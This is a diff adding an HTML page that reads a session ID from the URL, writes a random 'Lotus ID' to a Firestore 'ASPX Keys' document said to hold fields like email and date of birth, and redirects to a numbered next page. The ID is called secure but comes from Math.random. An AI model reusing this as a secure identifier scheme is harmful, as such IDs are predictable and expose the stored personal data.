@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing Session...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .error {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Authentication Step</h2>
+        <p id="status-message">Verifying session and generating secure ID...</p>
+        <button id="next-btn" disabled>Next</button>
+    </div>
+
+    <!-- Firebase SDK configured as a module -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-firestore.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+            authDomain: "question-metabase.firebaseapp.com",
+            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "question-metabase",
+            storageBucket: "question-metabase.firebasestorage.app",
+            messagingSenderId: "770698198753",
+            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+            measurementId: "G-6ZP1FPMKSJ"
+        };
+
+        // Initialize Firebase and Firestore
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // UI Elements
+        const statusMessage = document.getElementById('status-message');
+        const nextBtn = document.getElementById('next-btn');
+
+        // Variables
+        let lotusId = "";
+        let sessionId = "";
+
+        // Function to generate 15 digit alphanumeric code
+        function generateLotusId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < 15; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // Main execution function
+        async function processSession() {
+            // 1. Get session ID from URL (e.g., ?session=1591542856)
+            const urlParams = new URLSearchParams(window.location.search);
+            sessionId = urlParams.get('session');
+
+            if (!sessionId) {
+                statusMessage.innerHTML = "<span class='error'>Error: No session ID found in URL.</span>";
+                return;
+            }
+
+            // 2. Generate Lotus ID
+            lotusId = generateLotusId();
+
+            try {
+                // 3. Save to Firestore under "ASPX Keys" -> [Session ID]
+                // We use { merge: true } so it doesn't overwrite existing data (like email, dob, etc.)
+                const docRef = doc(db, "ASPX Keys", sessionId);
+                await setDoc(docRef, {
+                    lotus: lotusId
+                }, { merge: true });
+
+                // 4. Update UI to allow user to proceed
+                statusMessage.innerText = "ID Generated and saved successfully. Click Next to continue.";
+                nextBtn.disabled = false;
+
+            } catch (error) {
+                console.error("Error writing document: ", error);
+                statusMessage.innerHTML = `<span class='error'>Database Error: ${error.message}</span>`;
+            }
+        }
+
+        // Handle Next Button Click
+        nextBtn.addEventListener('click', () => {
+            if (lotusId) {
+                // Redirect to 8.html with the new lotus ID
+                window.location.href = `8.html?lotus=${lotusId}`;
+            }
+        });
+
+        // Run the process when the page loads
+        window.onload = processSession;
+    </script>
+
+</body>
+</html>
